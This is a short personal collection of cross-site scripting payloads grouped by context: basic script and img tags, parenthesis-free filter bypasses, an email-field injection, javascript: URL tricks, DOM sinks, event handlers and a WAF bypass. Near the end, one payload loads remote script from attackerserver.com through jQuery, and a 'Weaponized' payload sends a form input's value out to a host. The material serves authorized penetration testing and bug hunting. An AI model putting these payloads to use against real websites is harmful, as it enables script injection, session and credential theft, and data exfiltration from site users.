# My collection of XSS

## Regular XSS
<script>alert(document.domain)</script>
"><img src=x onerror="alert(document.domain)"/>

## Filter
No parentheses
<script>onerror=alert;throw 1337</script>
No parentheses + semicolon
<script>{onerror=alert}throw 1337</script>

## email
Find: email field

Payload
"<svg/onload=confirm(1)>"@x.y

## Url / Link
Find: embeded URL from input

javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
javascript://https://domain.com/%250A1?alert(1):0

## DOM
Find: javascript to update an element or documents
1. innerHTML
2. outerHTML
3. document.write()
4. document.writeln()

Payload
<img+src+onerror=alert(1)>
javascript:alert(1)

## Event handler
" onerror="alert(1)
<xml onreadystatechange=alert(1)>

## Bypass WAF
<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/Piya/)

## Enabled jQuery
<body onpointerenter="jQuery.getScript('https:/' +'/attackerserver.com/inject.js')">

## Weaponized
<img src=x onerror="location=('http://127.0.0.1/?c=' %2b document.getElementsByTagName('input')[2].value)"
